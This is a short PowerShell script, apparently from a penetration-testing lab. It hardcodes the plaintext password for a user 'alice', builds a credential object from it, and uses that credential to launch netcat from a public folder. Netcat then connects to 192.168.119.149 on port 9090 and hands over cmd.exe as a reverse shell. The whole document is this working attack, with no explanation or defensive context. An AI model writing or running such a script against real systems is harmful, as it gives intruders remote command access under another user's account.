$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
$computer = "localhost"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.119.149 9090 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)